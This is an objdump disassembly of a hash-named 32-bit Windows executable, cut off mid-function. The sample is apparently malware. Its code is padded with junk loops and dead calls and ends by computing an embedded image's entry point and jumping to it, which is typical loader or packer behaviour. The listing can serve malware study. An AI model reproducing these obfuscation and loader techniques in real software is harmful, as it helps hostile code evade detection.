
1a0ec1d0bf7d349f652c17c7b3166adcf2919810bbf1eeccf724cc76b7d03043.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x14c
  401009:	push   ebx
  40100a:	add    DWORD PTR ds:0x413d18,edx
  401010:	push   esi
  401011:	adc    eax,DWORD PTR ds:0x41400c
  401017:	push   edi
  401018:	adc    DWORD PTR ds:0x413c74,ecx
  40101e:	xor    esi,esi
  401020:	sbb    eax,DWORD PTR ds:0x413bfe
  401026:	mov    DWORD PTR [ebp-0x10],esi
  401029:	adc    edi,eax
  40102b:	mov    eax,DWORD PTR [ebp-0x20]
  40102e:	and    DWORD PTR ds:0x413c06,0x0
  401038:	jmp    0x40104a
  40103d:	mov    edi,DWORD PTR ds:0x413c06
  401043:	inc    edi
  401044:	mov    DWORD PTR ds:0x413c06,edi
  40104a:	cmp    DWORD PTR ds:0x413c06,0x12
  401051:	jae    0x40107f
  401057:	cmp    DWORD PTR ds:0x413c06,0x18
  40105e:	jne    0x401074
  401064:	push   0x413c74
  401069:	push   0x1062
  40106e:	call   DWORD PTR ds:0x41675c
  401074:	jmp    0x40103d
  401079:	xor    DWORD PTR ds:0x413bf6,ebx
  40107f:	push   0x5
  401081:	mov    DWORD PTR [ebp-0x20],eax
  401084:	pop    edi
  401085:	push   0x4164c8
  40108a:	call   DWORD PTR ds:0x416794
  401090:	push   esi
  401091:	and    DWORD PTR ds:0x413c70,0x414018
  40109b:	push   0x69
  40109d:	push   0xe
  40109f:	push   0x6
  4010a1:	push   0x4
  4010a3:	xor    DWORD PTR ds:0x41401c,0x413c16
  4010ad:	push   0x87698897
  4010b2:	sbb    DWORD PTR ds:0x41401c,0x413c16
  4010bc:	call   DWORD PTR ds:0x416750
  4010c2:	push   esi
  4010c3:	add    DWORD PTR ds:0x413d2c,0x792b
  4010cd:	push   0x3
  4010cf:	push   0x2
  4010d1:	push   0x4
  4010d3:	sbb    DWORD PTR ds:0x414008,0x413c0e
  4010dd:	push   0x2
  4010df:	push   0x56778769
  4010e4:	push   0x76867576
  4010e9:	inc    DWORD PTR ds:0x413c74
  4010ef:	call   DWORD PTR ds:0x41674c
  4010f5:	add    DWORD PTR ds:0x413c6c,0x413d20
  4010ff:	dec    edi
  401100:	mov    DWORD PTR ds:0x413bf6,0x25f1
  40110a:	jne    0x401085
  401110:	push   0x4164f0
  401115:	sbb    DWORD PTR ds:0x414000,0x413c0e
  40111f:	push   esi
  401120:	push   esi
  401121:	and    DWORD PTR ds:0x413c78,0x5ead
  40112b:	call   DWORD PTR ds:0x416788
  401131:	test   eax,eax
  401133:	je     0x40114f
  401139:	mov    eax,ds:0x75687681
  40113e:	adc    ebx,DWORD PTR ds:0x413c0a
  401144:	imul   eax,eax,0x5463da1d
  40114a:	mov    ds:0x75687681,eax
  40114f:	mov    eax,DWORD PTR [ebp-0x20]
  401152:	mov    DWORD PTR ds:0x41401c,0x2026
  40115c:	mov    ebx,0xf89c85b0
  401161:	mov    DWORD PTR ds:0x413c78,0x6385
  40116b:	cmp    eax,ebx
  40116d:	jne    0x4011cf
  401173:	add    DWORD PTR ds:0x414004,0x37c8
  40117d:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  401187:	push   DWORD PTR [ebp+0x10]
  40118a:	sub    DWORD PTR ds:0x413bfe,0x414004
  401194:	push   DWORD PTR [ebp+0xc]
  401197:	and    DWORD PTR ds:0x413c1a,0x413ce4
  4011a1:	push   DWORD PTR [ebp+0x8]
  4011a4:	xor    DWORD PTR ds:0x413d34,0x413d2c
  4011ae:	call   0x402685
  4011b3:	mov    ecx,DWORD PTR ds:0x4163b4
  4011b9:	mov    esi,DWORD PTR ds:0x413c1e
  4011bf:	or     DWORD PTR ds:0x413c06,esi
  4011c5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4011cb:	xor    esi,esi
  4011cd:	mov    DWORD PTR [ecx],eax
  4011cf:	mov    DWORD PTR [ebp-0x8],ebx
  4011d2:	sub    ecx,DWORD PTR ds:0x413d20
  4011d8:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4011df:	lea    eax,[ebp-0x60]
  4011e2:	xor    esi,DWORD PTR ds:0x413d18
  4011e8:	mov    DWORD PTR [ebp-0x48],eax
  4011eb:	lea    eax,[ebp-0x54]
  4011ee:	mov    DWORD PTR [ebp-0x1c],eax
  4011f1:	add    DWORD PTR ds:0x413c16,0x903
  4011fb:	mov    eax,ds:0x4163b4
  401200:	mov    eax,DWORD PTR [eax+0x1c8]
  401206:	adc    DWORD PTR ds:0x413cf4,edi
  40120c:	mov    eax,DWORD PTR [eax]
  40120e:	mov    esi,DWORD PTR ds:0x413ce4
  401214:	add    esi,DWORD PTR ds:0x413c16
  40121a:	mov    DWORD PTR ds:0x413ce4,esi
  401220:	mov    ecx,DWORD PTR [ebp-0x1c]
  401223:	xor    edi,edi
  401225:	mov    esi,0x7510894
  40122a:	xor    eax,esi
  40122c:	mov    edi,0x3272dc
  401231:	adc    DWORD PTR ds:0x413c78,0x59b2
  40123b:	add    eax,edi
  40123d:	mov    DWORD PTR ds:0x413d24,0x7b51
  401247:	mov    DWORD PTR [ecx],eax
  401249:	mov    eax,ds:0x4165e0
  40124e:	mov    DWORD PTR ds:0x413c80,0x7e03
  401258:	cmp    eax,0x312bc9f6
  40125d:	mov    DWORD PTR ds:0x413d24,0x296e
  401267:	jne    0x401312
  40126d:	mov    eax,DWORD PTR [ebp-0x8]
  401270:	mov    ecx,DWORD PTR ds:0x4163b4
  401276:	mov    ecx,DWORD PTR [ecx+0x198]
  40127c:	xor    eax,esi
  40127e:	add    eax,edi
  401280:	mov    edx,DWORD PTR ds:0x413c6c
  401286:	xor    DWORD PTR ds:0x414010,edx
  40128c:	mov    DWORD PTR [ecx],eax
  40128e:	movzx  ecx,BYTE PTR ds:0x413c6c
  401295:	and    ecx,DWORD PTR ds:0x413d2c
  40129b:	mov    DWORD PTR ds:0x413c6c,ecx
  4012a1:	mov    eax,DWORD PTR [ebp-0x8]
  4012a4:	mov    DWORD PTR ds:0x413cd8,0x1b
  4012ae:	cmp    DWORD PTR ds:0x413cd8,0x0
  4012b5:	je     0x401303
  4012bb:	cmp    DWORD PTR ds:0x413cd8,0x1c
  4012c2:	jne    0x4012dd
  4012c8:	push   0x104b
  4012cd:	push   0x413d18
  4012d2:	push   0x2575
  4012d7:	call   DWORD PTR ds:0x416760
  4012dd:	xor    edx,edx
  4012df:	xor    edx,DWORD PTR ds:0x413cd8
  4012e5:	dec    edx
  4012e6:	mov    DWORD PTR ds:0x413cd8,edx
  4012ec:	jmp    0x4012ae
  4012f1:	mov    edx,DWORD PTR ds:0x413ce8
  4012f7:	or     edx,DWORD PTR ds:0x413c7c
  4012fd:	mov    DWORD PTR ds:0x413ce8,edx
  401303:	xor    eax,esi
  401305:	add    eax,edi
  401307:	or     ecx,DWORD PTR ds:0x413d24
  40130d:	mov    ds:0x4165e0,eax
  401312:	mov    eax,ds:0x4163b4
  401317:	mov    eax,DWORD PTR [eax+0x18c]
  40131d:	and    DWORD PTR ds:0x413c1a,0x0
  401327:	jmp    0x401339
  40132c:	mov    ecx,DWORD PTR ds:0x413c1a
  401332:	inc    ecx
  401333:	mov    DWORD PTR ds:0x413c1a,ecx
  401339:	cmp    DWORD PTR ds:0x413c1a,0x15
  401340:	jae    0x40136e
  401346:	cmp    DWORD PTR ds:0x413c1a,0x20
  40134d:	jne    0x401369
  401353:	push   0x6f97
  401358:	push   DWORD PTR [ebp-0x18]
  40135b:	push   0x2919
  401360:	push   DWORD PTR [ebp-0x14]
  401363:	call   DWORD PTR ds:0x416764
  401369:	jmp    0x40132c
  40136e:	mov    eax,DWORD PTR [eax]
  401370:	xor    edx,edx
  401372:	or     edx,DWORD PTR ds:0x413c0e
  401378:	adc    DWORD PTR ds:0x413cdc,edx
  40137e:	mov    DWORD PTR [ebp-0xa4],eax
  401384:	xor    eax,eax
  401386:	xor    eax,DWORD PTR ds:0x413cd0
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	sbb    DWORD PTR ds:0x413d34,eax
  401394:	mov    eax,0xf89c85bc
  401399:	xor    edx,ecx
  40139b:	mov    DWORD PTR [ebp-0x10],eax
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	mov    DWORD PTR [ebp-0x10],eax
  4013a4:	sub    ecx,ecx
  4013a6:	mov    DWORD PTR [ebp-0x1c],ebx
  4013a9:	or     DWORD PTR ds:0x413c80,0x7e3b
  4013b3:	mov    DWORD PTR [ebp-0x10],eax
  4013b6:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4013bd:	add    DWORD PTR ds:0x413d34,edi
  4013c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4013c6:	xor    ecx,esi
  4013c8:	add    ecx,edi
  4013ca:	mov    DWORD PTR [ebp-0x18],ecx
  4013cd:	add    DWORD PTR ds:0x414018,edi
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	and    DWORD PTR ds:0x413c7c,0xe1
  4013e0:	mov    edx,DWORD PTR [ebp-0xc]
  4013e3:	adc    DWORD PTR ds:0x413d28,0x413d20
  4013ed:	xor    edx,esi
  4013ef:	xor    ecx,esi
  4013f1:	sbb    DWORD PTR ds:0x414014,0x47d8
  4013fb:	add    ecx,edx
  4013fd:	movzx  edx,BYTE PTR ds:0x41400c
  401404:	and    DWORD PTR ds:0x413bf6,edx
  40140a:	mov    edx,DWORD PTR [ebp-0xc]
  40140d:	xor    edx,esi
  40140f:	lea    ecx,[ecx+edx*1+0x975894]
  401416:	cmp    DWORD PTR [ebp-0x18],ecx
  401419:	ja     0x4015f5
  40141f:	or     eax,DWORD PTR ds:0x413bfa
  401425:	mov    eax,DWORD PTR [ebp-0xc]
  401428:	mov    ecx,DWORD PTR ds:0x413c80
  40142e:	xor    DWORD PTR ds:0x413ce8,ecx
  401434:	mov    ecx,DWORD PTR [ebp-0x18]
  401437:	sbb    DWORD PTR ds:0x413d20,0x413d34
  401441:	xor    eax,esi
  401443:	and    DWORD PTR ds:0x413cdc,0x413d24
  40144d:	lea    eax,[eax+ecx*1+0x3272dc]
  401454:	sub    DWORD PTR ds:0x414008,0x413cd8
  40145e:	push   eax
  40145f:	sbb    DWORD PTR ds:0x413c0a,edi
  401465:	mov    eax,DWORD PTR [ebp-0x1c]
  401468:	xor    DWORD PTR ds:0x413c80,0x7b1e
  401472:	xor    eax,esi
  401474:	lea    eax,[ebp+eax*1+0x3272e4]
  40147b:	or     DWORD PTR ds:0x413c16,0x7d42
  401485:	push   eax
  401486:	mov    DWORD PTR ds:0x414018,0x19
  401490:	cmp    DWORD PTR ds:0x414018,0x0
  401497:	je     0x4014cb
  40149d:	cmp    DWORD PTR ds:0x414018,0x28
  4014a4:	jne    0x4014bb
  4014aa:	push   DWORD PTR [ebp-0x14]
  4014ad:	push   DWORD PTR [ebp-0x18]
  4014b0:	push   0x400000
  4014b5:	call   DWORD PTR ds:0x416768
  4014bb:	mov    eax,ds:0x414018
  4014c0:	dec    eax
  4014c1:	mov    ds:0x414018,eax
  4014c6:	jmp    0x401490
  4014cb:	mov    eax,ds:0x4163b4
  4014d0:	and    DWORD PTR ds:0x413c6c,0x2ac9
  4014da:	push   DWORD PTR [eax+0x1bc]
  4014e0:	call   0x40a25b
  4014e5:	mov    eax,DWORD PTR [ebp-0xc]
  4014e8:	sbb    edx,edx
  4014ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4014ed:	and    DWORD PTR ds:0x413d24,0x0
  4014f7:	mov    edx,DWORD PTR ds:0x413d24
  4014fd:	inc    edx
  4014fe:	mov    DWORD PTR ds:0x413d24,edx
  401504:	cmp    DWORD PTR ds:0x413d24,0x1c
  40150b:	jne    0x401525
  401511:	push   DWORD PTR [ebp-0x14]
  401514:	push   0x413d30
  401519:	push   DWORD PTR [ebp-0x1c]
  40151c:	push   DWORD PTR [ebp-0x24]
  40151f:	call   DWORD PTR ds:0x416770
  401525:	cmp    DWORD PTR ds:0x413d24,0x1b
  40152c:	jb     0x4014f7
  401532:	xor    eax,esi
  401534:	lea    eax,[ecx+eax*1+0x3272dc]
  40153b:	mov    ecx,DWORD PTR [ebp-0xc]
  40153e:	mov    edx,DWORD PTR [ebp-0xc]
  401541:	dec    DWORD PTR ds:0x413bf6
  401547:	xor    edx,esi
  401549:	xor    ecx,esi
  40154b:	sbb    DWORD PTR ds:0x413c1e,0x34e4
  401555:	add    ecx,edx
  401557:	and    DWORD PTR ds:0x413c02,0x0
  401561:	jmp    0x401573
  401566:	mov    edx,DWORD PTR ds:0x413c02
  40156c:	inc    edx
  40156d:	mov    DWORD PTR ds:0x413c02,edx
  401573:	cmp    DWORD PTR ds:0x413c02,0x1b
  40157a:	jae    0x4015bf
  401580:	cmp    DWORD PTR ds:0x413c02,0x1e
  401587:	jne    0x4015a7
  40158d:	push   0x413d28
  401592:	push   0x3ad3
  401597:	push   0x416152
  40159c:	push   0x416152
  4015a1:	call   DWORD PTR ds:0x416774
  4015a7:	jmp    0x401566
  4015ac:	movzx  edx,BYTE PTR ds:0x413ce8
  4015b3:	sub    edx,DWORD PTR ds:0x413c1a
  4015b9:	mov    DWORD PTR ds:0x413ce8,edx
  4015bf:	mov    edx,DWORD PTR [ebp-0xc]
  4015c2:	xor    DWORD PTR ds:0x413c80,0x413c74
  4015cc:	xor    edx,esi
  4015ce:	lea    ecx,[ecx+edx*1+0x975894]
  4015d5:	mov    DWORD PTR [ebp-0x18],eax
  4015d8:	cmp    eax,ecx
  4015da:	mov    DWORD PTR ds:0x413c7c,0x908
  4015e4:	jbe    0x40141f
  4015ea:	add    DWORD PTR ds:0x413cf4,ecx
  4015f0:	mov    eax,0xf89c85bc
  4015f5:	add    DWORD PTR ds:0x414014,ecx
  4015fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4015fe:	mov    DWORD PTR ds:0x416238,ecx
  401604:	mov    ecx,DWORD PTR [ebp+0x10]
  401607:	and    DWORD PTR ds:0x413c1a,0x0
  401611:	mov    edx,DWORD PTR ds:0x413c1a
  401617:	inc    edx
  401618:	mov    DWORD PTR ds:0x413c1a,edx
  40161e:	cmp    DWORD PTR ds:0x413c1a,0x25
  401625:	jne    0x40163e
  40162b:	push   DWORD PTR [ebp-0x1c]
  40162e:	push   0x414004
  401633:	push   0x416170
  401638:	call   DWORD PTR ds:0x416778
  40163e:	cmp    DWORD PTR ds:0x413c1a,0x19
  401645:	jb     0x401611
  40164b:	mov    DWORD PTR ds:0x41648c,ecx
  401651:	adc    DWORD PTR ds:0x413c1e,ebx
  401657:	mov    ecx,DWORD PTR ds:0x416238
  40165d:	mov    edx,DWORD PTR ds:0x414014
  401663:	xor    DWORD PTR ds:0x413c0e,edx
  401669:	mov    edx,DWORD PTR [ebp-0x48]
  40166c:	sub    ecx,edi
  40166e:	and    DWORD PTR ds:0x413cf0,0x24ff
  401678:	xor    ecx,esi
  40167a:	mov    DWORD PTR [edx],ecx
  40167c:	not    ecx
  40167e:	mov    ecx,DWORD PTR [ebp-0x20]
  401681:	mov    DWORD PTR ds:0x413c16,0x6aa9
  40168b:	cmp    ecx,ebx
  40168d:	mov    DWORD PTR ds:0x413c70,0x4e28
  401697:	jne    0x401b90
  40169d:	add    DWORD PTR ds:0x413d18,0x41400c
  4016a7:	lea    eax,[ebp-0x5c]
  4016aa:	and    DWORD PTR ds:0x413c16,0x3f2d
  4016b4:	mov    DWORD PTR [ebp-0xb0],eax
  4016ba:	lea    eax,[ebp+0x4]
  4016bd:	add    DWORD PTR ds:0x413cec,0x413d24
  4016c7:	mov    DWORD PTR [ebp-0x5c],eax
  4016ca:	mov    eax,DWORD PTR [ebp-0x5c]
  4016cd:	xor    DWORD PTR ds:0x413ce4,0x37e4
  4016d7:	test   eax,eax
  4016d9:	mov    DWORD PTR ds:0x413c7c,0x3884
  4016e3:	je     0x402663
  4016e9:	adc    DWORD PTR ds:0x413c12,ebx
  4016ef:	mov    eax,DWORD PTR [ebp-0x24]
  4016f2:	mov    eax,DWORD PTR [ebp-0xc]
  4016f5:	mov    eax,DWORD PTR [ebp-0x8]
  4016f8:	sub    ecx,0x1090
  4016fe:	mov    DWORD PTR [ebp+0xc],eax
  401701:	mov    eax,eax
  401703:	mov    eax,ds:0x4163b4
  401708:	and    DWORD PTR ds:0x413bfa,0x0
  401712:	jmp    0x401724
  401717:	mov    ecx,DWORD PTR ds:0x413bfa
  40171d:	inc    ecx
  40171e:	mov    DWORD PTR ds:0x413bfa,ecx
  401724:	cmp    DWORD PTR ds:0x413bfa,0x11
  40172b:	jae    0x401754
  401731:	cmp    DWORD PTR ds:0x413bfa,0x20
  401738:	jne    0x401749
  40173e:	push   0x4160de
  401743:	call   DWORD PTR ds:0x41677c
  401749:	jmp    0x401717
  40174e:	and    DWORD PTR ds:0x413c74,ecx
  401754:	mov    eax,DWORD PTR [eax+0x1c8]
  40175a:	and    DWORD PTR ds:0x414010,0x0
  401764:	mov    ecx,DWORD PTR ds:0x414010
  40176a:	inc    ecx
  40176b:	mov    DWORD PTR ds:0x414010,ecx
  401771:	cmp    DWORD PTR ds:0x414010,0xf
  401778:	jne    0x401791
  40177e:	push   0x413c0a
  401783:	push   DWORD PTR [ebp-0x20]
  401786:	push   0x4160b3
  40178b:	call   DWORD PTR ds:0x416780
  401791:	cmp    DWORD PTR ds:0x414010,0xe
  401798:	jne    0x4017ab
  40179e:	mov    ecx,DWORD PTR ds:0x414010
  4017a4:	inc    ecx
  4017a5:	mov    DWORD PTR ds:0x414010,ecx
  4017ab:	cmp    DWORD PTR ds:0x414010,0x1c
  4017b2:	jb     0x401764
  4017b8:	mov    DWORD PTR ds:0x413bf6,0x13
  4017c2:	cmp    DWORD PTR ds:0x413bf6,0x0
  4017c9:	je     0x401820
  4017cf:	cmp    DWORD PTR ds:0x413bf6,0x6
  4017d6:	jne    0x4017ec
  4017dc:	push   0x414018
  4017e1:	push   0x1023
  4017e6:	call   DWORD PTR ds:0x416784
  4017ec:	cmp    DWORD PTR ds:0x413bf6,0x7
  4017f3:	jne    0x401808
  4017f9:	xor    ecx,ecx
  4017fb:	add    ecx,DWORD PTR ds:0x413bf6
  401801:	dec    ecx
  401802:	mov    DWORD PTR ds:0x413bf6,ecx
  401808:	mov    ecx,DWORD PTR ds:0x413bf6
  40180e:	dec    ecx
  40180f:	mov    DWORD PTR ds:0x413bf6,ecx
  401815:	jmp    0x4017c2
  40181a:	adc    DWORD PTR ds:0x413ce8,ebx
  401820:	mov    eax,DWORD PTR [eax]
  401822:	and    DWORD PTR ds:0x414010,0x0
  40182c:	jmp    0x401840
  401831:	xor    ecx,ecx
  401833:	add    ecx,DWORD PTR ds:0x414010
  401839:	inc    ecx
  40183a:	mov    DWORD PTR ds:0x414010,ecx
  401840:	cmp    DWORD PTR ds:0x414010,0x19
  401847:	jae    0x401873
  40184d:	cmp    DWORD PTR ds:0x414010,0x27
  401854:	jne    0x401868
  40185a:	push   DWORD PTR [ebp-0x18]
  40185d:	push   0x4160de
  401862:	call   DWORD PTR ds:0x41678c
  401868:	jmp    0x401831
  40186d:	sub    DWORD PTR ds:0x413c0a,edi
  401873:	cdq    
  401874:	mov    ebx,eax
  401876:	mov    eax,0xfabdbeef
  40187b:	mov    ecx,DWORD PTR ds:0x413c1e
  401881:	or     DWORD PTR ds:0x413d1c,ecx
  401887:	add    ebx,eax
  401889:	mov    ecx,0x6f0c
  40188e:	adc    edx,0xffffffff
  401891:	and    DWORD PTR [ebp-0x10],0x0
  401895:	sub    DWORD PTR ds:0x413c6c,0x6250
  40189f:	xor    edx,0x0
  4018a2:	xor    DWORD PTR ds:0x413c84,ecx
  4018a8:	mov    DWORD PTR [ebp-0x80],edx
  4018ab:	mov    edx,DWORD PTR [ebp+0xc]
  4018ae:	mov    DWORD PTR ds:0x413c74,0x12
  4018b8:	cmp    DWORD PTR ds:0x413c74,0x0
  4018bf:	je     0x401906
  4018c5:	cmp    DWORD PTR ds:0x413c74,0x1e
  4018cc:	jne    0x4018f2
  4018d2:	push   DWORD PTR [ebp-0x24]
  4018d5:	push   0x413cd8
  4018da:	push   0x560c
  4018df:	push   0x416049
  4018e4:	push   DWORD PTR [ebp-0x18]
  4018e7:	push   0x1b95
  4018ec:	call   DWORD PTR ds:0x416790
  4018f2:	mov    ecx,DWORD PTR ds:0x413c74
  4018f8:	dec    ecx
  4018f9:	mov    DWORD PTR ds:0x413c74,ecx
  4018ff:	jmp    0x4018b8
  401904:	not    ecx
  401906:	mov    DWORD PTR [ebp-0x14],edx
  401909:	and    DWORD PTR ds:0x413c06,0x0
  401913:	jmp    0x401925
  401918:	mov    edx,DWORD PTR ds:0x413c06
  40191e:	inc    edx
  40191f:	mov    DWORD PTR ds:0x413c06,edx
  401925:	cmp    DWORD PTR ds:0x413c06,0x14
  40192c:	jae    0x401967
  401932:	cmp    DWORD PTR ds:0x413c06,0x5
  401939:	jne    0x401948
  40193f:	push   DWORD PTR [ebp-0xc]
  401942:	call   DWORD PTR ds:0x416798
  401948:	cmp    DWORD PTR ds:0x413c06,0x4
  40194f:	jne    0x401962
  401955:	mov    edx,DWORD PTR ds:0x413c06
  40195b:	inc    edx
  40195c:	mov    DWORD PTR ds:0x413c06,edx
  401962:	jmp    0x401918
  401967:	mov    ecx,0x8a29a125
  40196c:	xor    ebx,ecx
  40196e:	neg    DWORD PTR ds:0x413d18
  401974:	add    DWORD PTR [ebp-0x14],eax
  401977:	mov    DWORD PTR ds:0x414010,ebx
  40197d:	mov    edx,DWORD PTR [ebp-0x14]
  401980:	mov    DWORD PTR ds:0x41401c,0x7ba5
  40198a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40198e:	xor    edx,ecx
  401990:	add    DWORD PTR ds:0x414010,0x307
  40199a:	mov    DWORD PTR [ebp-0x78],edx
  40199d:	mov    edx,DWORD PTR [ebp-0x10]
  4019a0:	xor    edx,0x0
  4019a3:	mov    DWORD PTR ds:0x414018,0x4b60
  4019ad:	mov    DWORD PTR [ebp-0x74],edx
  4019b0:	cmp    DWORD PTR [ebp-0x78],ebx
  4019b3:	mov    DWORD PTR ds:0x413c02,0x936
  4019bd:	jne    0x4019df
  4019c3:	mov    DWORD PTR ds:0x413c0a,edx
  4019c9:	mov    edx,DWORD PTR [ebp-0x80]
  4019cc:	cmp    DWORD PTR [ebp-0x74],edx
  4019cf:	mov    DWORD PTR ds:0x413c7c,0x301a
  4019d9:	je     0x401aa0
  4019df:	and    DWORD PTR ds:0x413d34,0x0
  4019e9:	jmp    0x4019fb
  4019ee:	mov    edx,DWORD PTR ds:0x413d34
  4019f4:	inc    edx
  4019f5:	mov    DWORD PTR ds:0x413d34,edx
  4019fb:	cmp    DWORD PTR ds:0x413d34,0x16
  401a02:	jae    0x401a25
  401a08:	cmp    DWORD PTR ds:0x413d34,0x26
  401a0f:	jne    0x401a20
  401a15:	push   0x414014
  401a1a:	call   DWORD PTR ds:0x41679c
  401a20:	jmp    0x4019ee
  401a25:	mov    edx,DWORD PTR ds:0x4163b4
  401a2b:	neg    DWORD PTR ds:0x414008
  401a31:	mov    edx,DWORD PTR [edx+0x1c0]
  401a37:	mov    DWORD PTR ds:0x413bf6,0x5ff4
  401a41:	mov    edx,DWORD PTR [edx]
  401a43:	and    DWORD PTR ds:0x413ce0,0x41400c
  401a4d:	xor    ebx,ebx
  401a4f:	add    edx,eax
  401a51:	mov    DWORD PTR ds:0x413c78,0x3f53
  401a5b:	adc    ebx,0xffffffff
  401a5e:	and    DWORD PTR ds:0x413c02,0x1b79
  401a68:	xor    edx,ecx
  401a6a:	add    DWORD PTR ds:0x413ce0,0x413c6c
  401a74:	xor    ebx,0x0
  401a77:	mov    DWORD PTR ds:0x413bfa,0x4fab
  401a81:	cmp    edx,0x70941fd5
  401a87:	mov    DWORD PTR ds:0x413d2c,0x7f9c
  401a91:	jne    0x402663
  401a97:	cmp    ebx,0xffffffff
  401a9a:	jne    0x402663
  401aa0:	mov    edx,DWORD PTR ds:0x416430
  401aa6:	add    DWORD PTR ds:0x413cdc,0x3946
  401ab0:	mov    ebx,DWORD PTR ds:0x416438
  401ab6:	and    DWORD PTR ds:0x413c80,0x3ee6
  401ac0:	xor    edx,ebx
  401ac2:	mov    DWORD PTR ds:0x414000,0x16
  401acc:	cmp    DWORD PTR ds:0x414000,0x0
  401ad3:	je     0x401b12
  401ad9:	cmp    DWORD PTR ds:0x414000,0x26
  401ae0:	jne    0x401af6
  401ae6:	push   0x413c84
  401aeb:	push   0x56a1
  401af0:	call   DWORD PTR ds:0x41675c
  401af6:	mov    ebx,DWORD PTR ds:0x414000
  401afc:	dec    ebx
  401afd:	mov    DWORD PTR ds:0x414000,ebx
  401b03:	jmp    0x401acc
  401b08:	add    DWORD PTR ds:0x413c84,0x1062
  401b12:	mov    DWORD PTR ds:0x416430,edx
  401b18:	mov    ebx,DWORD PTR ds:0x416430
  401b1e:	and    DWORD PTR ds:0x413d20,0x0
  401b28:	jmp    0x401b3a
  401b2d:	mov    edx,DWORD PTR ds:0x413d20
  401b33:	inc    edx
  401b34:	mov    DWORD PTR ds:0x413d20,edx
  401b3a:	cmp    DWORD PTR ds:0x413d20,0x1a
  401b41:	jae    0x401b72
  401b47:	cmp    DWORD PTR ds:0x413d20,0x25
  401b4e:	jne    0x401b67
  401b54:	push   DWORD PTR [ebp-0x24]
  401b57:	push   0x413d1c
  401b5c:	push   0x7dc0
  401b61:	call   DWORD PTR ds:0x416760
  401b67:	jmp    0x401b2d
  401b6c:	adc    DWORD PTR ds:0x413bfe,edi
  401b72:	mov    edx,DWORD PTR [ebp-0x5c]
  401b75:	xor    DWORD PTR ds:0x413c7c,0x413c1e
  401b7f:	add    DWORD PTR [edx],ebx
  401b81:	mov    DWORD PTR ds:0x414010,0x3837
  401b8b:	jmp    0x402624
  401b90:	mov    DWORD PTR ds:0x41401c,0x671d
  401b9a:	mov    ecx,DWORD PTR [ebp-0x60]
  401b9d:	mov    DWORD PTR ds:0x413c02,0x3bc3
  401ba7:	cmp    ecx,0xf89c85b1
  401bad:	je     0x401d26
  401bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  401bb6:	mov    edx,DWORD PTR [ebp-0x54]
  401bb9:	or     DWORD PTR ds:0x413c1a,0x413cdc
  401bc3:	xor    ecx,esi
  401bc5:	add    ecx,edi
  401bc7:	cmp    ecx,edx
  401bc9:	je     0x401d26
  401bcf:	mov    DWORD PTR ds:0x413d28,0x18
  401bd9:	cmp    DWORD PTR ds:0x413d28,0x0
  401be0:	je     0x401c32
  401be6:	cmp    DWORD PTR ds:0x413d28,0xa
  401bed:	jne    0x401c07
  401bf3:	push   0x7420
  401bf8:	push   DWORD PTR [ebp-0xc]
  401bfb:	push   DWORD PTR [ebp-0x20]
  401bfe:	push   DWORD PTR [ebp-0x14]
  401c01:	call   DWORD PTR ds:0x416764
  401c07:	cmp    DWORD PTR ds:0x413d28,0xb
  401c0e:	jne    0x401c1f
  401c14:	mov    eax,ds:0x413d28
  401c19:	dec    eax
  401c1a:	mov    ds:0x413d28,eax
  401c1f:	xor    eax,eax
  401c21:	add    eax,DWORD PTR ds:0x413d28
  401c27:	dec    eax
  401c28:	mov    ds:0x413d28,eax
  401c2d:	jmp    0x401bd9
  401c32:	mov    eax,ds:0x4163b4
  401c37:	mov    DWORD PTR ds:0x413c88,0x7ef
  401c41:	mov    eax,DWORD PTR [eax+0x194]
  401c47:	mov    ecx,DWORD PTR [eax]
  401c49:	mov    eax,DWORD PTR [ecx+0x3c]
  401c4c:	adc    DWORD PTR ds:0x413c74,0x414014
  401c56:	push   DWORD PTR ds:0x41648c
  401c5c:	add    DWORD PTR ds:0x413c1e,0x413d24
  401c66:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c6a:	push   DWORD PTR ds:0x416238
  401c70:	add    DWORD PTR ds:0x414000,0x414014
  401c7a:	add    eax,ecx
  401c7c:	mov    DWORD PTR ds:0x413d1c,0x15
  401c86:	cmp    DWORD PTR ds:0x413d1c,0x0
  401c8d:	je     0x401ce5
  401c93:	cmp    DWORD PTR ds:0x413d1c,0x3
  401c9a:	jne    0x401cb1
  401ca0:	push   0x8408
  401ca5:	push   DWORD PTR [ebp-0x24]
  401ca8:	push   DWORD PTR [ebp-0x1c]
  401cab:	call   DWORD PTR ds:0x416768
  401cb1:	cmp    DWORD PTR ds:0x413d1c,0x4
  401cb8:	jne    0x401ccb
  401cbe:	mov    ecx,DWORD PTR ds:0x413d1c
  401cc4:	dec    ecx
  401cc5:	mov    DWORD PTR ds:0x413d1c,ecx
  401ccb:	xor    ecx,ecx
  401ccd:	or     ecx,DWORD PTR ds:0x413d1c
  401cd3:	dec    ecx
  401cd4:	mov    DWORD PTR ds:0x413d1c,ecx
  401cda:	jmp    0x401c86
  401cdf:	add    DWORD PTR ds:0x413bfa,ecx
  401ce5:	mov    ecx,DWORD PTR ds:0x4163b4
  401ceb:	mov    ecx,DWORD PTR [ecx+0x194]
  401cf1:	or     DWORD PTR ds:0x414000,0x5329
  401cfb:	push   DWORD PTR [ecx]
  401cfd:	call   eax
  401cff:	mov    ecx,DWORD PTR ds:0x4163b4
  401d05:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d0b:	mov    DWORD PTR ds:0x413c78,0x5666
  401d15:	mov    DWORD PTR [ecx],eax
  401d17:	mov    DWORD PTR ds:0x413d24,0x5c21
  401d21:	jmp    0x402663
  401d26:	adc    edx,DWORD PTR ds:0x413cf0
  401d2c:	mov    ecx,DWORD PTR [ebp-0x8]
  401d2f:	sub    edx,DWORD PTR ds:0x413c70
  401d35:	mov    edx,DWORD PTR [ebp-0xa4]
